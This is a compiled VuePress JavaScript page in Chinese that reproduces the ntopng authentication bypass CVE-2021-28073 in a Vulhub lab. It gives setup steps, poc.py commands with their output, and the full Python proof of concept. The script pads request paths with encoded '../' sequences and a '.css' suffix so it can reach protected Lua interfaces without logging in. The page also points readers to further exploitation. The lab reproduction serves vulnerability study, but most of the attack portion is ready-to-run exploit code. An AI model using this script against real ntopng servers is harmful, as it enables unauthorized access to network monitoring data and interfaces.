import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as l,c,a as n,b as s,d as p,e as t}from"./app-58e4a7d6.js";const i={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"ntopng是监控服务器网络流量的工具，对外提供Web页面。其4.2及以前的版本中存在一处权限绕过漏洞，利用该漏洞可以未授权访问目标任意接口。",-1),k=n("p",null,"参考链接：",-1),d={href:"http://noahblog.360.cn/ntopng-multiple-vulnerabilities/",target:"_blank",rel:"noopener noreferrer"},g=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动ntopng：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>将被跳转到登录页面，默认密码admin/admin，首次登录将会重设密码。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),b={href:"https://github.com/vulhub/vulhub/blob/master/ntopng/CVE-2021-28073/poc.py",target:"_blank",rel:"noopener noreferrer"},v=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py --url http://your-ip:3000/ baselength
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281132047.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，Vulhub靶场中的长度为36。</p><p>然后，找到我们想要越权访问的页面或接口，比如<code>/lua/find_prefs.lua</code>，正常访问时会302跳转到登录页面，无权限。</p><p>使用POC生成越权访问URL：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py --url http://your-ip:3000/ generate -l 36 -p find_prefs.lua
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281133101.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问这个URL，发现可以越权返回正常信息：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281133775.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>后续更深入的利用方法，可以自行修改poc.py利用。</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> logging


<span class="token keyword">def</span> <span class="token function">is_ntopng</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span> <span class="token keyword">and</span> <span class="token string">&#39;/lua/login.lua&#39;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_base_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">&#39;/lua/&#39;</span> <span class="token operator">+</span> <span class="token string">&#39;%2e%2f&#39;</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token string">&#39;as_stats.lua.css&#39;</span>
        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">255</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">&#39;as_stats.lua&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">&#39;/lua/&#39;</span> <span class="token operator">+</span> <span class="token string">&#39;%2e%2f&#39;</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token string">&#39;get_macs_data.lua.css&#39;</span>
        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">255</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">&#39;get_macs_data.lua&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>


<span class="token keyword">def</span> <span class="token function">get_padding_length</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    padding_length <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> base_length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> padding_length <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;path </span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string"> is not support&#39;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>padding_length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>


logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>WARNING<span class="token punctuation">)</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;CVE-2021-28073 POC for ntopng.&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;base url for ntopng, eg: http://192.168.1.233:3000&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;&lt;URL&gt;&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-v&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--verbose&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>

    subparsers <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_subparsers<span class="token punctuation">(</span>dest<span class="token operator">=</span><span class="token string">&#39;action&#39;</span><span class="token punctuation">)</span>

    baselength_command <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;baselength&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;get base path length of ntopng&#39;</span><span class="token punctuation">)</span>

    generate_command <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;generate&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;generate the authenticate bypass url&#39;</span><span class="token punctuation">)</span>
    generate_command<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-l&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--length&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;base path length of target ntopng&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;&lt;LENGTH&gt;&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    generate_command<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--path&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;lua pathname&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;&lt;PATH&gt;&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    generate_command <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;include&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;generate the arbitrary file inclusion url&#39;</span><span class="token punctuation">)</span>
    generate_command<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-l&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--length&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;base path length of target ntopng&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;&lt;LENGTH&gt;&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    generate_command<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-i&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--include&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;path to include&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;&lt;PATH&gt;&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>verbose<span class="token punctuation">:</span>
        logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>

    base_url <span class="token operator">=</span> args<span class="token punctuation">.</span>url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>

    <span class="token comment"># check target</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> is_ntopng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">&#39;No Ntopng detected&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>action <span class="token operator">==</span> <span class="token string">&#39;baselength&#39;</span><span class="token punctuation">:</span>
        base_length <span class="token operator">=</span> get_base_length<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;ntopng install path length: </span><span class="token interpolation"><span class="token punctuation">{</span>base_length<span class="token punctuation">}</span></span><span class="token string">\\n&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>action <span class="token operator">==</span> <span class="token string">&#39;generate&#39;</span><span class="token punctuation">:</span>
        base_length <span class="token operator">=</span> args<span class="token punctuation">.</span>length
        path <span class="token operator">=</span> args<span class="token punctuation">.</span>path
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">&#39;/lua/&#39;</span> <span class="token operator">+</span> <span class="token string">&#39;%2e%2f&#39;</span> <span class="token operator">*</span> get_padding_length<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">&#39;.css\\n&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12);function m(h,_){const a=o("ExternalLinkIcon");return l(),c("div",null,[r,u,k,n("ul",null,[n("li",null,[n("a",d,[s("http://noahblog.360.cn/ntopng-multiple-vulnerabilities/"),p(a)])])]),g,n("p",null,[s("根据参考链接中的方法，编写一个简单的"),n("a",b,[s("poc.py"),p(a)]),s("。首先，计算出ntopng lua目录的长度：")]),v])}const w=e(i,[["render",m],["__file","ntopng权限绕过漏洞 CVE-2021-28073.html.vue"]]);export{w as default};
